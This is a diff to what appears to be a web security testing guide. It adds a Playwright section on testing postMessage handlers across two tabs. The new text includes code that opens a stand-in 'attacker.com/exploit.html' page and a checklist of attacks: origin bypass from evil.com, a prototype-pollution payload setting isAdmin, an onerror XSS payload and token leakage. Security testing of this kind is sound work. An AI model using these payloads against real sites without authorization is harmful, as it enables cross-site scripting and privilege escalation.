@@ -131,16 +131,45 @@ const consoleErrors = await page.context().pages()[0].evaluate(() => {
 });
 ```
 
-#### PostMessage Capture
+#### PostMessage Capture — Multi-Tab Test
+
+Listen on the target page, then trigger from a second tab:
 
 ```js
+// Tab 1: Navigate to target page and start listening
 await page.goto('https://target.com/vulnerable-page');
 await page.evaluate(() => {
   window.addEventListener('message', (e) => {
     console.log('[POSTMESSAGE]', JSON.stringify({origin: e.origin, data: e.data}));
   });
 });
-// Trigger the postMessage from another context
+
+// Tab 2: Open a new tab that sends postMessage to the opener
+const tab2 = await context.newPage();
+await tab2.goto('https://attacker.com/exploit.html');
+// The exploit page does: window.opener.postMessage({...}, '*');
+// Tab 1's listener captures it via console messages
+
+// Check captured messages
+const msgs = await page.context().pages()[0].evaluate(() => {
+  // Read from a window-level array if listener stored them
+  return window.__postMessages || [];
+});
+```
+
+If the target uses `window.postMessage` for cross-origin communication (OAuth popups, third-party widgets, payment iframes), test:
+1. **Origin validation bypass** — send `{...}` from `https://evil.com` — does the target accept it?
+2. **Data structure injection** — send unexpected data types (string instead of object, array instead of string)
+3. **Prototype pollution via postMessage** — send `{__proto__: {isAdmin: true}}`
+4. **XSS via postMessage** — if target reads `event.data.html` and sets `innerHTML`
+5. **Credential leakage** — check if target sends tokens/cookies back via postMessage response
+
+```js
+// Test: send malicious postMessage as if from an allowed origin
+await page.evaluate(() => {
+  window.postMessage({type: 'renderHtml', html: '<img src=x onerror=alert(1)>'}, '*');
+});
+// Check console for errors and snapshot for injected content
 ```
 
 #### CSP / Client-Side Security
